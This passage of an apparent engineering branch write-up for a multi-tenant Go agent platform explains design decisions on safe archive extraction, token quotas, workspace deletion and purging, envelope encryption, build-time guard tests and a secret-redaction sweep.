  archives on one platform.
- **The two containment checks are not equal partners, and the code says so.**
  A mutation test showed that deleting the join-time string check leaves every
  traversal test passing, because the parent-resolution check catches those
  too. The join check stays as a fast path — it refuses an obviously hostile
  name before any syscall — but the comment no longer claims it is an
  independent defence. Recording that asymmetry matters: the next reader would
  otherwise assume two defences and feel safe removing the expensive one.

`SelectTarGz` is a second entrypoint for the self-updater, which pulls two
known binaries out of a release tarball entirely in memory. Separate rather
than "extract then read two files", because nothing there writes an
attacker-controlled path, so traversal is structurally unreachable rather than
merely checked — and collapsing the two operations would weaken that. It still
takes the bounds, which is what `internal/updates` was missing: it capped each
entry at 512 MiB and nothing else, so an archive of ten thousand entries all
named `soulacy` allocated half a gigabyte ten thousand times in sequence.

### The inert token quotas: one mechanism, and a loud config error

`ratelimit.per_user_tokens_day` and `per_agent_tokens_day` had TWO
implementations, and the surprise on inspection was which one was inert.

`internal/ratelimit` kept in-memory 24h buckets, a recorder, two hourly
sweepers and two middlewares — and the middlewares were mounted, on `/chat`,
`/chat/stream`, `/webhooks/:agent_id` and `/runs`. Nothing anywhere called the
recorder. Not the engine, not the gateway. So every bucket was permanently
zero, both middlewares compared zero against the limit, and every request was
allowed. An operator who set a daily token quota got a config line, a
middleware visible in the route table, and a status endpoint reporting
`tokens_used: 0` on a deployment burning millions of tokens a day.

That version had **eleven passing tests.** Every one of them filled a bucket by
hand and asserted the middleware refused — the recurring failure shape on this
branch: testing a helper directly rather than the production call site. Eleven
green tests, and the quota did not exist.

Meanwhile the SAME two config keys are read by `internal/costs`, which enforces
them properly:

| | ratelimit buckets | costs reservation |
|---|---|---|
| filled by | **nothing** | the engine, after every LLM response |
| durability | in memory; a restart hands everyone a fresh budget | SQLite |
| scope | credential / agent | workspace, subject, agent, provider |
| admission | read-then-allow | `TryReserve` |

The last row is the decisive one and the reason this is not a matter of taste.
A read-then-allow check lets N concurrent requests all read the same
under-limit total and all proceed; a reservation is what stops that, and it is
the only moment a quota is actually tested.

**Decision: the ratelimit implementation is deleted.** What that package still
owns is request-RATE limiting (`per_user_rpm`, `per_agent_rpm`), where an
in-memory counter is the right tool because the window is a minute and losing
it on restart costs nothing. `tokens_used` is REMOVED from
`GET /rate-limit/status` rather than zeroed — a field that always reads zero is
worse than an absent one, because it answers the question and the answer is
wrong in the reassuring direction. The response now carries
`tokens_enforced_by: "costs"` and a pointer to `/api/v1/costs/status`.

**One hole remained after the deletion, and it is now a startup error.** The
surviving mechanism only rejects when `costs.enforcement_mode` is `"hard"`; in
soft or off mode the limit is carried all the way into a `ReservationPolicy`
and then not applied. `config.Validate` refuses to start on a token quota set
without hard enforcement, naming the setting and the remedy. An error rather
than a warning specifically because of what came before: refusing to boot is
what makes sure the replacement cannot fail the same silent way.

The eleven bucket tests are replaced by four in `internal/costs` that record
usage the way the engine does and then ask the reservation path — the one an
LLM call actually traverses — whether the next call is admitted.

### The deletion route: request → window → purge, and why that order is the safeguard

`POST /workspace/deletion` deletes nothing. It moves the workspace to
`deleting` — which `workspaceContextMW` already reads to refuse new writes and
runs — and records a deadline. Nothing is destroyed until that deadline passes.

A deletion that begins by removing data is one nobody can undo. A deletion that
begins by refusing writes is one that can, and the mistake this protects
against is usually noticed by somebody OTHER than the person who made it, who
has to be awake, in another timezone, and looking.

`internal/tenancy.WorkspaceLifecycle` is a SEPARATE interface from
`MemberManager`, deliberately. Membership administration is routine; beginning
a workspace deletion is the one irreversible action in the product. Folding it
into the interface every membership handler already holds would put it one typo
away from all of them.

Four decisions in the route:

- **The STORE decides, not the read.** The handler reads the workspace's status
  to run the gates, then calls `BeginDeletion`, which refuses anything but
  `active` inside an advisory lock. A gate checked against a value fetched a
  moment ago is a gate two concurrent owners both pass — and the second one's
  recovery window would silently replace the first's, so the deletion fires at
  a moment neither of them chose.
- **A closed window answers 410, not 409.** "There was nothing to cancel" and
  "there was, and you have missed it" mean opposite things to an owner racing
  the deadline: one should stop looking, the other should call support now.
- **`CompleteDeletion` runs AFTER the purge, never before.** `deleted` is the
  state that makes a workspace unreadable to its own members, so setting it
  first would hide a removal in progress from exactly the people entitled to
  watch it, and would make a purge that then failed indistinguishable from one
  that succeeded.
- **An incomplete purge still marks the workspace deleted, and returns
  `ErrIncomplete` with the survivor list.** The alternative — holding it in
  `deleting` until coverage is total — would leave a workspace the customer was
  told is gone in a state no operator can resolve. "Deleted, and these classes
  survived" is the honest record.

A Personal deployment answers **501** with the remedy, rather than a no-op
success. Its only workspace is the installation; deleting it means removing the
data directory, and reporting a deletion that did not happen would be the
inverse of invariant 7 — Personal must not acquire multi-user behaviour, and
must not acquire a lie either.

This also gave `checkDeletionGates` and `newDeletionReport` their first
production callers. They had been written, tested and left unwired, which is a
state worth naming: a tested helper with no call site passes every review and
protects nothing.

### The purge sweep, and why a lease rather than a lock

`Server.StartWorkspacePurgeSweep` is the thing that makes a requested deletion
actually happen. Without it the product has a deletion API that records an
intention and never acts on it: the workspace sits at `deleting`, refusing
writes, data intact, forever — with the customer having been told it would be
gone on a date, and nothing but a database query able to reveal otherwise. That
is worse than having no delete endpoint at all.

`ClaimPurge` takes an **expiring lease**, not a lock, and the difference is the
failure mode each one has. A lock released only on a clean exit leaves a
workspace unpurgeable forever when the instance holding it dies mid-purge —
permanently, silently, for a customer who has been told the data is gone. A
lease that expires means the next sweep picks it up. What that costs is a
duplicated purge after a hung instance's lease runs out, which is safe
precisely because every purger is idempotent: a `DELETE` of rows already gone
and a `RemoveAll` of a directory already removed both succeed.

The claim is **one UPDATE with the condition in its WHERE clause**, so the
check and the claim are the same statement. Read-then-claim in two statements
is how two instances both see an unclaimed workspace and both proceed — the
same mistake the token quota's read-then-allow made, in a place where the cost
is two concurrent purges rather than an overspend.

`DueForPurge` is a **selector, not a guard**, and the code says so. Mutation
testing makes the asymmetry visible: replacing that query with any list
containing the right workspace leaves every test passing, because the real
check that a window has closed lives in `PurgeWorkspaceIfDue`. Recording it
stops the next reader assuming two independent checks and removing the
expensive one.

The sweep logs an **incomplete purge at ERROR and a complete one at INFO**,
which is the opposite of the natural instinct. A completed deletion is an
ordinary event. A deletion that left data behind is the one somebody has to act
on, and it is invisible everywhere else — the customer sees a deleted workspace
and the API returns nothing further.

### MU-032's purge executor: the report is the product

`internal/workspacepurge` is built the same way `internal/workspaceexport` is,
and for the same reason: the plan is projected from the ownership catalog, and
every class with no registered purger appears in the deletion report **by
name**, saying its data survived. There is no path that produces a short
report, so a short report cannot be mistaken for a complete deletion.

The two packages are deliberately the same shape because they are the same
claim seen from two sides. An export says "here is everything you had"; a
deletion says "none of that is left". If those lists could disagree, one of
them is lying and the customer cannot tell which.

What makes the deletion side stricter is that an incomplete one has no benign
reading. An export missing a class is a customer who did not get all their data
— annoying, recoverable, visible to them. A deletion missing a class is data
that outlives a deletion somebody was told completed. So `Report.Complete` is
**computed**, never assigned; it is false whenever any class is unsettled; and
`Survivors` names them.

`Outcome` has five values, and the distinction between the last two is the one
that matters most to whoever reads a report: `not-purged` (no purger exists —
deterministic, fixed by writing code) and `failed` (a purger ran and could not
finish — retrying may help). Collapsing them makes a permanent gap look
transient, which is how a known gap gets retried forever instead of fixed.

Three decisions worth not undoing:

- **The tables purged come from the ownership catalog**, via `CatalogTables`,
  not from a literal beside each purger. A table added to a resource is purged
  the day it is classified. A hand-written list is the same second-inventory
  mistake the exporter avoids, and here drift means data outliving a deletion.
- **The workspace COLUMN is read from `PRAGMA table_info`**, not from the
  catalog's ScopeKey prose, which says things like `"workspace_id (column:
  workspace)"`. Parsing a human sentence for a SQL identifier works until
  somebody rephrases it, and the failure is a `DELETE` matching nothing and
  reporting success. A classified table that is absent, or present with no
  workspace column, is an **error**: during a deletion the safe reading of a
  catalog/schema disagreement is that something is not being deleted.
- **One transaction per resource.** A partial delete across a resource's tables
  leaves referential wreckage — chunks without their document — that is worse
  than not having started, because the next attempt must reason about a state
  no code produced.

**The tree purger refuses the personal workspace, unconditionally.**
`wsroot.Dir` resolves the personal workspace — and any *unusable* id — to the
base directory, which is the safe failure for a read and the catastrophic one
for a delete: "remove this tenant's tree" becomes "remove every tenant's tree,
and the installation's data with it". That refusal has one condition and three
diagnosis branches, not three checks: mutation testing showed the natural
three-check version was one real check with two decorations, and three checks
that look like defence in depth and are not is worse than one honest check.

**A finding that changed the design: there is no single workspace file tree.**
`wsroot.Dir(base, id)` is applied per store with a different base each time —
the agent dirs, `<root>/studio/drafts`, the trace dir, the skills base — so a
workspace's files live in a dozen `.workspaces/<id>` directories under a dozen
different parents. A `Purger.Also` field, letting one subtree removal claim it
settled agents, drafts, traces and skills together, was written and then
removed: the premise was false, and shipping it would have let a purger make a
claim that reads as verified and is not. Per-class tree purgers, each with its
own base, is the honest shape.

**The gap is a written list.** `TestTheWorkspacePurgeCoverageGapIsAKnownList`
holds every uncovered class in `notYetPurged` with what is missing for it, and
fails the build in both directions — a resource added to the catalog without a
purger or an entry, and an entry naming a class that is now covered. Today
`runs`, `workboard` and `workspace-exports` are purged; twenty-four classes are
listed with their reasons. The two most interesting are not oversights:
`secrets` says cryptographic erasure rather than a row delete, because a
`DELETE` leaves the ciphertext recoverable from a backup; and `credentials`
says revoke-then-purge in that order, because a credential must not be usable
in the window between the two.

### MU-025 criterion 5: the window a background job walks through

"Background jobs revalidate workspace status and policy before committing" was
blocked on workspaces having no status. They have one now, and closing it
turned out to be about a WINDOW rather than a permission.

Every background job carries a workspace it obtained from a request that has
already returned: the preference miner runs after a Studio save, the learning
replay runs at startup over whatever the loader holds. `workspaceContextMW`
refuses writes to a workspace that has entered `deleting` — but it refuses them
at the EDGE, and these jobs are past it. So a save made a second before an
owner requested deletion mines a preference into that workspace minutes later,
and a startup replay teaches lessons into a workspace whose recovery window
closed while the process was down.

**Neither is a leak, and that is why it went unnoticed.** The data lands in the
right tenant. What it defeats is the recovery window's other half: "new writes
stop when deletion begins" is what makes the window meaningful, and a customer
who cancels on day six should get back the workspace they had on day one, not
one that has been quietly accumulating derived data throughout. A write that
lands after the PURGE is worse — data surviving a deletion the report said
completed.

`backgroundWriteAdmitted` **fails open**, and that is a decision rather than an
oversight. Blocking derived-data jobs on a tenancy database outage trades a
rare stale write for a total, silent stop — and a deployment with no workspace
lifecycle at all, which is every Personal one, would never learn again. An
empty status reads as active for the same reason: otherwise upgrading stops
every background job in every existing workspace at once.

The replay checks **once per workspace**, not once per event: a read per event
would be thousands of queries to answer a question whose answer is the same
every time.

### The membership audit trail is keyset-paginated too

Both audit trails now paginate the same way, and the reason is the same: an
offset cursor skips or repeats rows whenever a write lands between two pages,
and these tables are append-only under exactly the conditions somebody reads
them — during an investigation, while access is being changed. An audit trail
that repeats records is one an investigator cannot count; one that skips them
is worse.

Three details worth keeping:

- **A cursor the server did not issue is a 400, not an empty page.** Answered
  with no results, a client bug and a tampering attempt both look exactly like
  the end of the trail, and an investigator concludes it stopped there.
- **`next_cursor` is always present, empty on the last page.** Omitting it
  there would make an exhausted trail indistinguishable from a server too old
  to paginate, so a client written against two versions would have to guess
  which it was looking at.
- **The cursor decoder uses `SplitN(raw, "|", 3)`, not `Split`.** An audit ID
  may contain the separator, and a plain `Split` would reject a legitimate
  cursor for *some* rows and not others — a failure that surfaces long after
  the code was written, for one customer, once.

The scope predicate in the paginated query is character-identical to the
unpaginated one's, which is load-bearing rather than tidy: a page whose filter
differs from the list's returns rows the caller cannot see anywhere else, or
hides rows they can.

### Per-workspace limits: the composition IS the security boundary

MU-030 criterion 1 was blocked on storage. The multi-level quota machinery
(MU-024) could always express a per-workspace ceiling; what it could not do was
let anyone but the deployment operator set one, because the only source was a
YAML file on the gateway's disk. A Team Preview customer with twenty workspaces
could not give one team a smaller budget than another without a config edit and
a restart.

`internal/workspacepolicy` stores what a workspace has set on ITSELF, and the
one property that makes it safe to hand to a workspace owner is that **a stored
entry can only tighten**. `Compose` takes the smaller positive of the stored
value and the operator's, so an owner writing `daily_usd: 1000000` gets
whatever the deployment already allowed.

**That is enforced by the composition, not by a validation on write, and the
difference is the whole design.** A write-time check protects the endpoints
that remember to call it — and this store will grow more of them: an import, a
template, a migration, a support tool. A composition rule protects every one of
them including the ones not written yet, because none can turn a stored number
into an effective ceiling without going through it.

Details worth keeping:

- **Zero means unlimited, never zero.** A naive `min` would let an unset field
  on either side erase a real ceiling on the other — so a workspace could clear
  its daily budget by setting only a concurrency limit. That is the loosening
  this file exists to prevent, arriving through the back door.
- **Retention goes the same direction, for a sharper reason.** Letting a tenant
  LENGTHEN retention imposes storage cost — and, in a jurisdiction with a
  deletion obligation, legal exposure — on an operator who chose a shorter
  window deliberately.
- **A corrupt or non-positive stored window is IGNORED, not treated as zero.**
  Zero reads downstream as "retention disabled", so a bad value would silently
  turn pruning off for that tenant: the exact inverse of what somebody setting
  a retention policy wants. `-1h` parses as a valid duration, which is how that
  bug reached the deployment-wide config on this branch in the first place.
- **The response reports what is IN FORCE, not only what was stored.** An owner
  who sets a number above the deployment's ceiling is told immediately, rather
  than discovering it the first time a run is refused with nothing connecting
  the two events.
- **A failed reload keeps the previous policy.** Installing whatever was read is
  catastrophic on an empty result: every workspace's ceiling disappears at once,
  from a transient database error, with nothing in the API to show it happened.
- **Budgets are stored in micros, not the float an owner typed.** A budget
  compared against accumulated spend has to be exact, and float dollars
  accumulate rounding until "$25.00" is not $25.00 — which surfaces as a
  customer refused at $24.999999 with no explanation anyone can give.

One redundancy was found and removed rather than kept. The handler originally
both assigned `req.WorkspaceID = identity.WorkspaceID()` and passed the
identity's workspace to `Store.Set`. Mutation testing showed the pair is
mutually redundant — remove either and the isolation test still passes — which
makes both untestable and neither obviously load-bearing. The argument is the
guard, and the assignment is gone.

### The load harness: coordinated omission, and why the profile is data

MU-027's p95 targets needed two things that did not exist. A target with no
profile is unfalsifiable — "p95 under 300ms" says nothing until somebody states
at what concurrency, over what mix, across how many workspaces — and a profile
with no harness is a paragraph. `internal/loadprofile` is both, and the profile
is DATA rather than prose so it can be validated, disagreed with, and changed
on purpose rather than by drift. Every target carries a `Why`, and
`Profile.Validate` refuses a target that states a number without one.

**The measurement problem this package exists to get right is coordinated
omission**, and it is worth naming because almost every hand-rolled load
harness has it. A closed-loop harness — send, wait for the response, send the
next — cannot issue a request while the server is stalled. The requests that
WOULD have been slow are never made, so a server that freezes for a second
produces a handful of one-second samples instead of the thousands of
increasingly-late ones a real client population would see. **The p95 it reports
gets more optimistic the worse the server behaves.**

The fix is structural rather than careful: `Recorder.Observe` takes a
`scheduledAt` time, not a duration. A caller holding a duration has already
chosen what to measure from, and the convenient choice — the moment the
goroutine actually got to send — is the one that hides the stall. This
signature makes the correct measurement the easy one and the wrong one
impossible to express. `TestAStallMakesTheMeasurementWorseNotBetter` drives a
fake clock through a 500ms freeze and fails if the reported p95 stays small.

Other decisions worth not undoing:

- **Nearest-rank percentiles, not interpolated.** An interpolated p95 is a
  number no request experienced, which is the wrong thing to put in a service
  target. Nearest-rank returns a real observation.
- **The rank arithmetic carries an epsilon**, because `0.3*10` is
  `3.0000000000000004` in float64 and a plain `math.Ceil` returns 4 where the
  definition wants 3. Both boundary directions are tested.
- **A failed request still contributes its latency.** Dropping errors flatters
  the percentiles exactly when the server is struggling, which is the condition
  the measurement exists to detect.
- **An operation with no samples has NOT met its target.** Scoring it as met is
  how a mix that stopped including an operation passes forever. `Met(nil)` is
  false for the same reason: a harness that measured nothing and reported
  success is the failure this file is trying to avoid.
- **p95 is enforced; p99 is reported.** A p95 that passes with a p99 ten times
  larger is a system with a stall in it, and the stall generates the support
  tickets — but a p99 target on a ten-second sample is mostly noise, and a
  flaky gate is one people disable.
- **At least two workspaces, always.** A single-tenant profile measures a code
  path no Team deployment runs, and would miss every per-workspace lookup this
  branch added.
- **A missing request driver is refused up front**, rather than producing a
  report with one unexplained empty operation that somebody spends an afternoon
  reading as a latency problem.

Behind a build tag and NOT in `make test`: it runs for ten seconds, and a
latency gate whose pass/fail depends on how busy the machine is teaches people
to ignore failures. `make loadtest` runs it.

### MU-015 part 2: envelope encryption, and why the derived key could not rotate

Until now every credential for one (workspace, agent) was encrypted under a key
derived by HKDF from a machine secret. That is a real tenant boundary — two
workspaces' ciphertext is unreadable to each other, and a query that escapes
its workspace predicate still yields bytes the reader cannot open. **What it
cannot do is rotate.** The key is a pure function of the master secret, so
changing the key means changing the master secret, and changing the master
secret makes every credential in every workspace permanently unreadable. A
design whose only rotation is total data loss has no rotation.

Envelope encryption separates the two jobs. A random per-workspace DATA key
encrypts the credentials; a WRAPPING key encrypts the data key. Rotating mints
a new data-key version and leaves the old one wrapped and readable, so
ciphertext written under version 1 stays decryptable while new writes use
version 2. **Rotation becomes a key operation rather than a data migration** —
which matters because a data migration over a vault is the one that cannot fail
halfway.

`KeyWrapper` is a separate interface from `KMSProvider` for a reason worth
keeping: `DeriveKey` computes a key locally from a secret this process holds,
`WrapKey` asks a key service to encrypt something under a key this process
never sees. **A cloud KMS can implement the second and cannot implement the
first** — which is precisely why the derived-key design could not be backed by
one.

Decisions worth not undoing:

- **The version lives in a COLUMN, not a magic prefix on the ciphertext.**
  Legacy blobs begin with a random 12-byte nonce, so one in four billion starts
  with whatever magic you chose — and that one decrypts as the wrong format. A
  column is unambiguous.
- **The read shape follows the SCHEMA, not the KMS capability**, and those come
  apart in the case that matters. A vault written by a build with a wrapping
  KMS and reopened by one without would, on the KMS-shaped read, treat every
  enveloped row as legacy and fail with a MAC error — "corruption" — when the
  data is fine and the KMS is wrong. Worse on the write side: an INSERT that
  omits `key_version` leaves the column at its old value while replacing the
  ciphertext with legacy bytes, so the row claims to be enveloped and is not,
  and **nothing can ever read it again with no error at the moment it happens.**
  That case has its own test.
- **AAD binds each ciphertext to (workspace, agent, key).** Without it a
  ciphertext is portable: a database write that swaps two rows produces two
  credentials that decrypt fine and hold each other's values — which for a
  credential means an agent quietly authenticating as something else. The
  separator is a NUL, so `("ws","a","bc")` and `("ws","ab","c")` cannot collide.
- **The wrapping key's derivation label contains a byte no agent id can hold.**
  Otherwise an agent literally named `wrap` would share the key that protects
  every data key in the workspace, and compromising that one agent would unwrap
  the tenant.
- **Rotating and re-encrypting are two endpoints**, because they are two
  operations. Rotating is instant and stops the bleeding; re-encrypting touches
  every row, closes out the old key, and is safe to re-run after failing
  partway. One endpoint doing both would mean an operator responding to an
  incident cannot take the instant action without also starting the slow one.
- **Version 0 stays readable forever**, not "until a migration runs". A vault
  restored from a backup taken before this change contains version-0 rows, and
  a build that could not read them would turn a restore into data loss.

One redundancy is stated rather than defended: the `retired_at IS NULL` clause
in `newest` is redundant today, because `rotate` retires N and immediately
mints N+1 so the highest version is always un-retired. Mutation testing
confirms removing it breaks nothing. It stays for the operation that does not
exist yet — retiring a key WITHOUT a replacement, which a compromise response
wants — where the ordering alone would keep handing out the key an operator
just disabled.

## Guards worth keeping

- **`TestRequestScopeIsNeverReadFromADetachedGoroutine`** (AST-based) fails the
  build if `s.agents(c)` or `s.studio(c)` is read inside a `go func()`. Fiber
  recycles the request context when a handler returns, so doing so is a
  use-after-free that surfaces as a nil dereference deep in fasthttp, far from
  the cause. **This guard has already caught two real defects** that no test of
  the feature itself would have found.
- **`TestEveryEventFieldIsClassified`** (reflection-based) fails the build when
  a field is added to `message.Event` without a decision about whether it
  crosses the wire, and when a classification entry outlives its field.
- **`make security`** runs the isolation-escape and noisy-neighbour suite
  alone, under the race detector. The same tests run in ordinary CI; the target
  is for when you are changing something that touches a tenant boundary and
  want the attacker's tests to fail first.
- **`TestDispatchStillReportsSideEffects`** (AST-based) fails the build if tool
  dispatch stops reporting side effects. Deleting those two lines compiles,
  runs every tool exactly as before, and silently makes every lost run look
  retry-safe — the whole failure is an absence, so there is no output to
  assert on.
- **`TestUndiscoverableRepositoriesAreTrulyUndiscoverable`** keeps the
  ownership catalog's `Undiscoverable` flag honest: marking a store the AST
  scan *can* see is itself a failure, so the flag cannot become a way to delete
  any store from the inventory check by adding one field.
- **`TestEveryFiberAppInThisPackageRetainsItsStringsSafely`** fails the build on
  a Fiber app constructed without `Immutable: true`. Production always set it —
  `server.go`'s config comment says why — but ten TEST helpers did not, and the
  gap was invisible until it corrupted state: a test that created agent
  `canvas`, updated it, then posted to `/studio/save` found the stored agent's
  id had become `saveas`, six bytes of a later request's path sitting under a
  live loader map key. It surfaced as a save answering 422 instead of 409, i.e.
  a test failing with a plausible and entirely wrong diagnosis about a guard
  that was working correctly. A harness that differs from production in one
  setting does not report the difference; it reports a bug in the code.
- **`TestEveryDurableAgentWriteChecksAPrecondition`** (AST-based) fails the
  build when a handler writes an agent through `Upsert`, `Delete` or
  `RestoreAgentVersion` without calling a precondition guard, unless it is
  named in `unguardedAgentWrites` with the reason it cannot lose work. Paired
  with `TestTheUnguardedListDoesNotOutliveItsCallers`, which fails when an
  allowlist entry names a function that no longer writes an agent — otherwise
  the next function to take that name inherits the exemption silently.
- **`ValidateSources` + `TestASourceNamingAnUnknownResourceIsRefused`**
  (`internal/workspaceexport`) refuse an exporter naming a resource class the
  ownership catalog does not carry. Without it a typo is perfectly quiet: the
  Source runs, its bytes go nowhere, and the class it was meant to fill stays
  `not-exported` — an export missing a resource whose exporter somebody wrote,
  reviewed and shipped.
- **`TestArchivesAreOnlyOpenedThroughTheSafeExtractor`** fails the build on a
  `tar.NewReader`/`zip.NewReader`/`gzip.NewReader` anywhere outside
  `internal/safearchive`, unless the file is named in `allowedElsewhere` with
  the reason its threat model differs. Three extractors existed before it, each
  with a different subset of the same guards — which is the shape a rule takes
  when it is a convention rather than a mechanism. A fourth written next year
  gets the policy by not being allowed to exist.
- **`TestTheWorkspacePurgeCoverageGapIsAKnownList`** fails the build when a
  resource class survives a workspace deletion without being named in
  `notYetPurged` with what is missing for it — and equally when an entry there
  names a class that is now purged. A deletion gap discoverable only by reading
  a report from a customer's workspace is not a gap anybody fixes.
- **`TestEveryBackgroundWriterRevalidatesTheWorkspace`** (AST-based) fails the
  build when a function named in `backgroundWriters` commits derived data
  without calling `backgroundWriteAdmitted`. A list rather than a pattern,
  because "runs outside a request" is not something a parser can see — and the
  line you add is the prompt to think about the recovery window. This rule's
  violation is otherwise invisible: the data lands in the right tenant, nothing
  errors, and the only symptom is a window that quietly did not restore what it
  promised.
- **The ownership catalog discovery scan** now also finds loaders and
  package-level persistence keyed by a `root`/`dir` parameter. That closed a
  blind spot where `internal/studio/library.go` and `rulesstore.go` held
  workspace data that CI had never demanded be classified.

## Known remaining work

Highest-value first, with the reason each matters:

1. **MU-021's one open criterion.** Six of seven are closed. What is left is
   *"Scale mode supports independently scalable workers"* — the worker pool is
   in-process, so scaling it means scaling the gateway. That is not a gap in
   isolation but a deployment topology, and it belongs with M6's Scale stories
   (MU-033–037) where the queue and the worker fleet are separated. Building a
   half version here would put a distributed worker protocol in the wrong
   milestone. Criterion 2's *"explicit read-only inputs"* is also partial: the
   mount is read-write because a run's tree is where it writes. A read-only
   input set distinct from the writable scratch is a per-run mount manifest,
   which needs MU-024's quota work to know what a run is entitled to.
2. **MU-015 part 2** — envelope encryption with a versioned per-workspace data
   key under a production KMS wrapping key; per-run secret version references;
   redaction sweep across events, traces, prompts, and subprocess environments.
3. **MU-016** — artifacts and filesystem tools: server-generated object keys
   including workspace and run, path containment after symlink resolution,
   archive extraction that rejects traversal, escaping links, and decompression
   bombs.
4. **MU-016 cannot close yet either, and the remaining gap is architectural.**
   Four of its six criteria are met — server-generated object keys carrying the
   workspace, authenticated streaming, path containment after `EvalSymlinks`
   (`internal/runtime/filesystem_policy.go`, which fails closed with no roots),
   and expired artifacts becoming undownloadable immediately. What is left:

   - *"File tools operate only within **the run's** authorized mounts"* —
     **closed** by MU-021's per-workspace roots (see the write-up above). File
     tools resolve against the run's own tree, and the container mount is that
     same tree. What remains under this bullet is per-*run* scratch below the
     per-workspace root, which is tracked with the rest of MU-021.
   - *Archives* — **closed.** `internal/safearchive` is now the only place in
     the repo that opens an archive somebody else produced, and
     `TestArchivesAreOnlyOpenedThroughTheSafeExtractor` fails the build on a
     fourth extractor. See the write-up below for what the three previous ones
     were each missing.

5. **MU-025 is closed at 4 of 5 criteria.** Criterion 5's workspace-status
   half is a hook awaiting MU-032's workspace lifecycle, and criterion 3 is
   deferred by an explicit decision recorded in `docs/LEARNING_LINEAGE.md` and
   enforced by a failing-build guard. The original analysis, kept because the
   reasoning still holds:

   - *"Background jobs revalidate workspace status and policy before
     committing"* — **workspaces have no status.** `memberships` has
     active/suspended/deleted; `workspaces` has no lifecycle column at all.
     There is nothing to revalidate against until a workspace lifecycle exists,
     which belongs with MU-032 (export and delete workspace data).

     *(MU-032 has since added it: `tenancy.WorkspaceActive/Suspended/Deleting/
     Deleted`, with `WorkspaceAcceptsWrites`. The hook now has something to
     revalidate against, and closing this criterion means having the background
     collectors consult it before committing — the gateway edge already does.)*
   - *"Organization-wide sharing requires an explicit policy, source
     attribution, redaction, and opt-in destination"* — **there is no sharing
     surface.** Cross-workspace learning is disabled by default and structurally
     impossible today, so the criterion is currently vacuous. Building a policy
     framework for a feature nobody has specified would be speculative design.
   - Criteria 1 (workspace context on every learning job) and 2 (no crossing
     via caches or vector similarity) **are** met, and criterion 4 (deletion
     lineage) is met for conversation evidence.

   The honest next step is to decide whether org-sharing is in scope for Team
   Preview at all. If it is not, MU-025's third criterion should be struck or
   deferred explicitly rather than left to look unfinished.

5. **MU-017 is partially done.** Criteria 1, 2, 3 and 6 are met. Inventory is
   per workspace with platform directories as read-only templates;
   `ActionInstall` separates installing third-party code from using it;
   installs stage, verify a checksum, run the E20 safety pipeline, pin a
   revision and require approval before activation; and a manifest whose
   permissions change stops loading until a human re-approves. Criterion 5 is
   met for the credential half — an MCP subprocess no longer inherits the
   gateway environment — criterion 7 for MCP servers, and criterion 4. What
   remains is the filesystem/network half of criterion 5, which is MU-021's
   per-run isolation rather than a second implementation here, criterion 7 for
   plugin tool subprocesses, and per-workspace wiring of plugin *contributions*
   (channels and providers), which is deferred with MU-021 because sidecar
   supervision is process-level: one workspace per process is the honest
   granularity until runs are isolated.

6. **`BEGIN DEFERRED` on read-then-write transactions, elsewhere.** Two stores
   have been fixed (see below). The pattern to look for is a transaction that
   `SELECT`s and then `INSERT`s based on what it read; the safe ones open with
   a write (`costs.TryReserve` starts with a `DELETE`, which is why its
   concurrency test always passed). `internal/workboard`, `internal/knowledge`
   and `internal/studio/lessons.go` have not been audited.

## Verification

Every commit on this branch was verified with `go build ./...`, `go vet ./...`,
`go test ./...`, `make security` under `-race`, and the GUI suite (now 840 tests
across 76 files) before landing.

Three flakes were found and fixed along the way rather than tolerated, because
each failed under an unrelated test's name and would have cost someone an
afternoon:

- `TestChatStreamRunStaysCancellableWhileItIsStillRunning` returned while the
  cancelled run was still writing memory files, so `t.TempDir`'s `RemoveAll`
  raced them. It now drains the stream to EOF, which is the deterministic
  signal the run is done.
- `SQLiteHistoryStore.Close` was not idempotent. Closing an already-closed
  channel panics, so a store reached through two shutdown paths took the
  process down instead of returning an error.
- `wbWaitTerminalRun` bounded a real engine run at 5 seconds of wall clock.
  Under `go test ./...`, which runs every package concurrently, that failed
  about one run in ten with "run did not reach a terminal status" — a message
  that reads as a product hang rather than as a busy machine. The bound is now
  30s: longer costs nothing when things work, and stops the suite lying about
  which thing is broken.

One process note for whoever picks this up: run `gofmt -w` on the files you
touched, never on a whole tree. A repo-wide format pass in this branch's
history produced churn in a dozen untouched files — including a comment-list
reflow that degraded a doc comment in `internal/queue/memory` — and it had to
be reverted by hand before each commit.

## MU-015 — the redaction sweep (events, prompts, subprocess environments)

The envelope-encryption half of MU-015 closed earlier: versioned per-workspace
data keys, wrapped by a `KeyWrapper` a production KMS can implement, rotation
without re-encryption, AAD binding each ciphertext to its row. That protects
credentials **at rest, in the vault**. This half is about credentials **in
motion** — the copies that leave the vault and end up somewhere nobody
classified as a credential store.

### One predicate for "does this key name hold a secret"

Four implementations of that test existed and no two agreed:

| package | knew about | did not know about |
|---|---|---|
| `internal/redact` | api_key, password, dsn, connection_string, cookie | bearer, accesskey, passphrase |
| `internal/audit` | api_key, password, secret, token, credential, auth | bearer, cookie, passphrase, private_key |
| `internal/approvals` | the widest list, incl. pin, otp, seed, mnemonic | connection_string, database_url |
| `internal/gateway` | six markers | everything else |

`internal/audit` is the file an operator **ships to somebody else** when asking
for help, and it was one of the two narrowest. `internal/gateway`'s was the
fallback for channel types with no spec — that is, precisely the unknown ones
that need it most.

They are now one function, `redact.SecretKeyName`, and the divergence is a
build failure rather than a convention:
`TestOnlyOnePackageDecidesWhatLooksSecret` walks the repo for a list-shaped
line carrying three or more credential terms and fails on a fifth list.
Files that legitimately carry such a list are allowlisted **with the reason**:
`internal/injection/scanner.go` matches an attacker's sentence, not a field
name; `internal/llm/providerdoctor.go` classifies provider error text;
`internal/supportbundle` redacts YAML nodes; `internal/secrets/migrate.go`
names the keys that migrate into the vault.

**Normalisation before matching.** `X-Api-Key`, `x_api_key` and `apiKey` are
one case, not three. Four spellings of one header is exactly how a list ends up
with a hole nobody sees.

**Short terms match only at a word boundary.** `pin` as a substring redacts
every field called `mapping`. The approvals redactor does that today: a tool
argument named `mapping` is elided from what an approver is shown, for no
benefit. Affix matching keeps `pincode` and `userpin` and lets `mapping`
through. The trade is stated rather than hidden: a field named `author` starts
with `auth` and is redacted. A lost diagnostic beats a leaked credential, and
`TestTheOverRedactionTradeIsExplicit` records that this is a choice.

### Three leaks, one shape

Each was a second implementation of an already-protected boundary. In every
case the protection sat where somebody had recently thought about it and was
missing on the path the data actually took.

**1. The Postgres action log never redacted.** `internal/actionlog` redacts
tool arguments and results on the way in — same store, same contract. The
Postgres backend, which is *the one a Team deployment selects*, wrote them in
clear into a shared `agent_events` table that every workspace's rows live in.
So a solo operator's secrets were masked on disk, and adding colleagues
